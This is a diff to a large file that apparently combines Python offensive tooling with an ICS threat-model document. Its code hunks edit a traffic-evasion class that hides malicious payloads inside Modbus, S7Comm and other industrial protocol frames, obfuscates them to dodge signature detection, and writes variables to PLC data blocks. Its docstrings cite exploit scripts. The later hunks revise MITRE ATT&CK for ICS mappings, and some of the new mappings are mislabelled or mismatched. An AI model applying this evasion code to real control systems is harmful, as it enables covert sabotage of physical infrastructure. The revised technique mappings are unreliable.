@@ -15361,7 +15361,14 @@ class ProtocolEvasionEngine:
         self.traffic_patterns = self.analyze_legitimate_traffic()
 
     def mimic_legitimate_traffic(self, malicious_payload, target_protocol):
-        """Enhanced protocol traffic mimicry with multiple evasion layers"""
+        """Enhanced protocol traffic mimicry with multiple evasion layers
+        
+        Protocol implementations reference:
+        - Modbus: tools/modbus-stealth-toolkit/modbus_stealth_attack.py
+        - S7Comm: tools/s7comm_security_framework/s7comm_exploit.py
+        - CIP: tools/cip_security_assessment/cip_exploiter.py
+        - OPC-UA: tools/opcua_security_framework/opcua_exploit.py
+        """
         if target_protocol == 'modbus':
             return self.encase_in_modbus(malicious_payload)
         elif target_protocol == 'cip':
@@ -15374,11 +15381,16 @@ class ProtocolEvasionEngine:
             return self.encase_in_opc_ua(malicious_payload)
 
     def encase_in_modbus(self, payload):
-        """Advanced Modbus traffic encapsulation"""
+        """Advanced Modbus traffic encapsulation
+        
+        Reference: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:138-177
+        MBAP Header (7 bytes): Transaction ID (2) + Protocol ID (2) + Length (2) + Unit ID (1)
+        PDU: Function Code (1) + Data (N bytes)
+        """
         # Enhanced Modbus frame with realistic parameters
         modbus_wrapper = {
             'transaction_id': self.generate_transaction_id(),
-            'protocol_id': 0x0000,
+            'protocol_id': 0x0000,  # Modbus/TCP
             'length': 6 + len(payload),
             'unit_id': self.get_plc_unit_id(),
             'function_code': self.select_appropriate_function(len(payload)),
@@ -15386,12 +15398,16 @@ class ProtocolEvasionEngine:
             'quantity': len(payload) // 2,
             'byte_count': len(payload),
             'data': self.obfuscate_payload(payload),
-            'crc': self.calculate_modbus_crc()
+            'crc': self.calculate_modbus_crc()  # For RTU mode only
         }
         return self.build_modbus_frame(modbus_wrapper)
 
     def encase_in_s7comm(self, payload):
-        """Siemens S7Comm protocol encapsulation"""
+        """Siemens S7Comm protocol encapsulation
+        
+        Reference: tools/s7comm_security_framework/s7comm_exploit.py:94-140
+        Note: Complete S7Comm packet requires TPKT (4 bytes) + COTP (3 bytes) + S7 header
+        """
         s7_wrapper = {
             'protocol_id': 0x32,
             'message_type': 0x01,  # Job request
@@ -15399,7 +15415,7 @@ class ProtocolEvasionEngine:
             'protocol_data_unit_reference': self.generate_pdu_reference(),
             'parameter_length': len(payload) + 12,
             'data_length': len(payload),
-            'function_code': 0x05,  # Write variable
+            'function_code': 0x05,  # Write variable (S7FunctionCode.WRITE_VAR)
             'item_count': 0x01,
             'variable_specification': 0x12,
             'address_length': 0x0A,
@@ -15407,7 +15423,7 @@ class ProtocolEvasionEngine:
             'transport_size': 0x02,  # Byte
             'length': len(payload),
             'db_number': 1,
-            'area': 0x84,  # Data block
+            'area': 0x84,  # Data block (S7Area.DATA_BLOCKS)
             'address': 0x000000,
             'data': payload
         }
@@ -15453,11 +15469,17 @@ class ProtocolEvasionEngine:
             self.send_packet(packet)
 
     def protocol_fragmentation(self, large_payload, protocol):
-        """Fragment large payloads across multiple protocol messages"""
+        """Fragment large payloads across multiple protocol messages
+        
+        Protocol payload limits per specification:
+        - Modbus TCP: 253 bytes max (255 - Function Code - Byte Count)
+        - S7Comm: 240 bytes typical PDU (negotiable via S7 handshake)
+        - CIP: 504 bytes typical (EtherNet/IP encapsulation limit)
+        """
         if protocol == 'modbus':
-            max_chunk = 120  # Modbus TCP typically allows 125-255 bytes
+            max_chunk = 120  # Conservative Modbus TCP data size (spec allows 253)
         elif protocol == 's7comm':
-            max_chunk = 240  # S7Comm larger packet size
+            max_chunk = 240  # S7Comm PDU size (typically 240, max 960)
         else:
             max_chunk = 100  # Default conservative size
         
@@ -15473,13 +15495,16 @@ class ProtocolEvasionEngine:
         return fragmented_messages
 
     def select_appropriate_function(self, payload_size):
-        """Select most appropriate Modbus function code based on payload"""
+        """Select most appropriate Modbus function code based on payload
+        
+        Reference: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:78-99
+        """
         if payload_size <= 2:
             return 0x06  # Write Single Register
         elif payload_size <= 246:
             return 0x10  # Write Multiple Registers
         else:
-            return 0x17  # Report Slave ID (for large data)
+            return 0x17  # Read/Write Multiple Registers (for large data operations)
 
     def obfuscate_payload(self, payload):
         """Obfuscate payload to avoid signature detection"""
@@ -17258,10 +17283,10 @@ Advanced adversaries may target PLC hardware interfaces (JTAG, UART, firmware) t
   - Log all physical access and correlate with configuration changes
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0014`: Unauthorized Command Message
-- `ICSA-0032`: Valid Accounts
-- `ICSA-0033`: Modify Controller Tasking
-- `ICSA-0055`: Controller Firmware Change
+- `T0855`: Unauthorized Command Message
+- `T0859`: Valid Accounts
+- `T0821`: Modify Controller Tasking
+- `T0843`: Program Download
 
 ---
 
@@ -17355,10 +17380,10 @@ Legacy and proprietary field protocols (HART, PROFIBUS, WirelessHART) are often 
   - Block unauthorized field device additions via whitelist or certificate checks
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0003`: Command Message Injection
-- `ICSA-0020`: Wireless Compromise
-- `ICSA-0031`: Unauthorized Device Access
-- `ICSA-0057`: Connection Proxy
+- `T0855`: Unauthorized Command Message
+- `T0860`: Wireless Compromise
+- `T0866`: Exploitation of Remote Services
+- `T0884`: Connection Proxy
 
 ---
 
@@ -17465,9 +17490,9 @@ State actors may insert backdoors at manufacturing or intercept hardware during 
   - Log all firmware changes with signed admin actions
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0033`: Modify Controller Tasking
-- `ICSA-0014`: Unauthorized Command Message
-- `ICSA-0040`: Supply Chain Compromise
+- `T0821`: Modify Controller Tasking
+- `T0855`: Unauthorized Command Message
+- `T0862`: Supply Chain Compromise
 
 ---
 
@@ -17549,8 +17574,8 @@ Adversaries may attempt to gain physical access to control rooms, panels, or clo
   - Audit badge logs for unusual timing or off-hours entry
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0059`: Exploit Physical Access
-- `ICSA-0043`: Access Management
+- `T0848`: Exploit Public-Facing Application
+- M0800: Implement Secure Firmware Update (Mitigation)
 
 ---
 
@@ -17632,9 +17657,9 @@ Physical access enables attackers to disrupt systems by manipulating power, timi
   - Implement process watchdogs for critical system checks
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0045`: Block Command Message
-- `ICSA-0023`: Manipulation of Control
-- `ICSA-0059`: Exploit Physical Access
+- `T0803`: Block Command Message
+- `T0831`: Manipulation of Control
+- `T0848`: Exploit Public-Facing Application
 
 ---
 
@@ -17711,8 +17736,8 @@ Sophisticated attackers may attempt to erase hardware traces or hide manipulatio
   - Document serial numbers and component IDs in asset databases
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0040`: Supply Chain Compromise
-- `ICSA-0055`: Controller Firmware Change
+- `T0862`: Supply Chain Compromise
+- `T0843`: Program Download
 
 ---
 
@@ -17778,8 +17803,8 @@ Nation state APTs may employ quantum cryptanalysis, radiation-hardened implants,
   - Access logging down to individual module insertions
 
 ##### MITRE ATT&CK for ICS Mapping
-- `ICSA-0041`: Modify Device Logic
-- `ICSA-0040`: Supply Chain Compromise
+- `T0836`: Modify Parameter
+- `T0862`: Supply Chain Compromise
 
 ---
 
